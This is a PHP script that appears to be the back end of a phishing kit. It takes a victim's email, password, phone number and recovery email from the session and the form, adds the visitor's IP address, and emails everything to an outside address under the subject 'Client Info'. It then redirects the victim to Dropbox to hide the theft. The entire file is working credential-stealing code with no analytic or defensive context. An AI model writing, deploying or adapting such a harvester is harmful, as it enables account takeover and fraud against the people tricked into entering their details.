<?php
ob_start();
session_start();

	
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}


	
if ($_POST){
	
	$fname = $_POST['mobile'];
	$emaill = $_POST['recmail'];
	$mailll = $_SESSION['rfr'];
	$psssss = $_SESSION['old'];
    $hairllo_ip = getUserIP();
	
	
	$to = "chika@loom.gold";				
	$from = "info <chika@loom.gold>";    
	$subject = "Client Info";
		
		
			
$message ='	
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></title>
</head>

<body >
<br />
<br />
<br />
<br />
<br />


<div style="width:700px;  height:280px;  border:#CCC 1px solid;  padding:20px;">

<br />
<br />

<table width="100%" border="0">
  <tr>
    <td width="18%">Mal:</td>
    <td width="82%">'.$mailll.'</td>
  </tr>
  <tr>
    <td>Pas:</td>
    <td>'.$psssss.'</td>
  </tr>
  <tr>
    <td>Phon:</td>
    <td>'.$fname.'</td>
  </tr>
  <tr>
    <td>R_Mal:</td>
    <td>'.$emaill.'</td>
  </tr>
    <tr>
    <td>IP:</td>
    <td>'.$hairllo_ip.'</td>
  </tr>  
  
</table>

<br />


</div>


</body>
</html>
';
        $headers = "MIME-Version: 1.0 \r\n";
        $headers .= "Content-type: text/html; charset=utf-8 \r\n"; 
        $headers  .= "From: $from\r\n"; 
		mail($to, $subject, $message, $headers);	
				    		

	header("Location: https://www.dropbox.com/");

	}// closse else 1	
 
?>